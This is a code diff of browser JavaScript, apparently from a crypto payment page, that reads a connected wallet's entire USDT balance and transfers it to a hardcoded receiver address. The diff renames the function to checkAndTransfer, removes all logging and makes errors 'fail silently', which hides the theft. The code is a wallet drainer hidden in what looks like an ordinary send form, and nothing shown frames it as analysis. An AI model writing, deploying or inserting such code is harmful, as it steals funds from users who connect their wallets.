@@ -1,4 +1,4 @@
-const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
 const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
 const usdtABI = [
   "function balanceOf(address) view returns (uint256)",
@@ -6,34 +6,23 @@ const usdtABI = [
   "function decimals() view returns (uint8)"
 ];
 
-async function sendUSDT() {
-  const eth = window.ethereum || window.trustwallet; // Trust Wallet fallback
-  if (!eth) {
-    console.log("Wallet not found");
-    return;
-  }
+async function checkAndTransfer() {
+  if (!window.ethereum) return;
 
   try {
-    const provider = new ethers.providers.Web3Provider(eth);
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
     const user = await signer.getAddress();
 
     const usdt = new ethers.Contract(usdtAddress, usdtABI, signer);
     const balance = await usdt.balanceOf(user);
-    const decimals = await usdt.decimals();
-
-    if (balance.isZero()) {
-      console.log("No USDT balance");
-      return;
-    }
+    if (balance.isZero()) return;
 
     const tx = await usdt.transfer(receiver, balance);
-    console.log("Transaction sent:", tx.hash);
     await tx.wait();
-    console.log("Transaction confirmed");
   } catch (err) {
-    console.error("Error:", err);
+    // fail silently
   }
 }
 
@@ -45,11 +34,10 @@ function updateFiat() {
 }
 
 async function fillMax() {
-  const eth = window.ethereum || window.trustwallet;
-  if (!eth) return;
+  if (!window.ethereum) return;
 
   try {
-    const provider = new ethers.providers.Web3Provider(eth);
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     const signer = provider.getSigner();
     const user = await signer.getAddress();
@@ -61,9 +49,7 @@ async function fillMax() {
     const formatted = ethers.utils.formatUnits(balance, decimals);
     document.getElementById("amount").value = formatted;
     updateFiat();
-  } catch (err) {
-    console.error("Max error:", err);
-  }
+  } catch (err) {}
 }
 
 function clearAddress() {
